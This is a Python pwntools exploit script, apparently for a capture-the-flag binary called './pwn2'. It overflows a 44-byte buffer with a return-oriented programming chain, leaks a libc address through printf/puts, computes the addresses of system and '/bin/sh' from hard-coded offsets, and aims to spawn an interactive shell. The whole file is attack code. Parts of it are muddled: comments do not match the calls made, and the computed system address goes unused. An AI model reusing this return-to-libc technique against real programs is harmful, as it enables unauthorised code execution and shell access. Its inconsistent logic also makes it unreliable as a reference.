from pwn import *

p = process("./pwn2")

addr_printf_plt = 0x080483c0
addr_puts_plt = 0x080483e0
addr_system_plt = 0x080483f0
addr_main = 0x08048548
addr_ls_string = 0x08048670

offset_system = 0x003d7e0
offset_puts = 0x0067e30
offset_binsh_string = 0x017c968

'''
addr_gets = 0x080483c0
addr_puts = 0x080483e0
addr_system = 0x080483f0
'''
buffer_size = 44

###################################################
# ROP part 1 & 2
payload = cyclic(buffer_size)
payload += p32(addr_printf_plt) # ROP part 1: print out the address of puts GOT entry
payload += p32(addr_main) # ROP part 2: return back to main so that we can execute another payload with our leaked address
payload += p32(addr_puts_plt) # ROP part 1: print out the address of puts GOT entry
print(p.recvuntil("$"))
p.sendline(payload)

# receive the leaked address which we printed out
print(p.recvuntil("Bye!\n"))
addr_puts_got = p.recv(4)
print('addr_puts_got0', addr_puts_got)
print('addr_puts_got1', addr_puts_got.encode("hex"))
addr_puts_got = u32(addr_puts_got)
print('addr_puts_got2', hex(addr_puts_got))

#p.interactive()

# calculate binsh string
addr_binsh_got = addr_puts_got + (- offset_puts + offset_binsh_string)
addr_system_got = addr_puts_got + (- offset_puts + offset_system)

###################################################
# ROP part 3
payload = cyclic(buffer_size)
payload += p32(addr_printf_plt) # ROP part 3: call system with "/bin/sh" string
payload += 'JUNK'#p32(addr_main) # ROP part 4: return back to main so that we can execute another payload with our leaked address
#payload += "JUNK" # Return address after system, not needed
payload += p32(addr_ls_string) # ROP part 3

print(p.recvuntil("$"))
p.sendline(payload)

print(p.recvuntil("Bye!\n"))
derp = p.recv(4)
print('derp', derp)

#print(p.recvline())

p.interactive()



#print(addr_puts_got.encode("hex"))
#payload = 'ls\x00' + '/bin/sh0'*5 + cyclic(buffer_size - 8*5-3) + 


#payload += p32(addr_system)
#payload += p32(addr_printf)
#payload += p32(addr_ls_string)
#payload += p32(addr_system)


#print(payload)